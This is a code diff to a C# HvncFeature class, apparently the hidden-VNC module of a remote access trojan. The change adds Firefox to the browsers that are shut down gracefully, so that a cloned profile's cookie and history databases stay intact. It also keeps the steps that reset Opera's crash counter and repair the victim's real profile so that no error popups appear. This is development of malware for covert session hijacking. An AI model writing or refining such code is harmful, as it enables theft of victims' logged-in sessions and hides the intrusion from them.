@@ -1515,10 +1515,13 @@ internal static class HvncFeature
         const uint SYNCHRONIZE          = 0x00100000;
         const uint WAIT_TIMEOUT_MS      = 2500;
 
-        // Build set of PIDs that are Chromium browsers
+        // Build set of PIDs for browsers that need graceful shutdown.
+        // Firefox uses SQLite WAL mode — a hard kill leaves -wal/-shm files uncheckpointed,
+        // which can corrupt the cloned profile's cookie/history databases.
         var browserPids = new HashSet<uint>();
         foreach (var kv in _launchedPids)
-            if (_chromiumBrowsers.Contains(kv.Key))
+            if (_chromiumBrowsers.Contains(kv.Key) ||
+                kv.Key.Equals("firefox.exe", StringComparison.OrdinalIgnoreCase))
                 browserPids.Add(kv.Value);
         if (browserPids.Count == 0) return;
 
@@ -1580,19 +1583,8 @@ internal static class HvncFeature
     {
         string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-        string tmp      = Path.GetTempPath();
 
-        // ── 1. Nuke HVNC temp profiles entirely so Opera always starts fresh ──
-        // These dirs are created by the --user-data-dir= flag in the HVNC launch cmd.
-        // Force-killing Opera corrupts them; deleting them is the only reliable fix.
-        foreach (var hvncDir in new[] { "hvnc_opera", "hvnc_operagx" })
-        {
-            string d = Path.Combine(tmp, hvncDir);
-            if (Directory.Exists(d))
-                try { Directory.Delete(d, true); } catch { }
-        }
-
-        // ── 2. Reset crash-recovery counter (ATTEMPTS registry key) ──────────
+        // ── 1. Reset crash-recovery counter (ATTEMPTS registry key) ──────────
         // Chromium increments this on each start; never decrements when killed by HVNC.
         // At high values Opera shows 3 cascading "profile error" popups on next launch.
         try
@@ -1603,7 +1595,7 @@ internal static class HvncFeature
         }
         catch { }
 
-        // ── 3. Repair the real Opera profile (lock files + JSON validation) ──
+        // ── 2. Repair the real Opera profile (lock files + JSON validation) ──
         foreach (var variant in new[] { "Opera Stable", "Opera GX Stable" })
         {
             foreach (var root in new[] { appData, localApp })
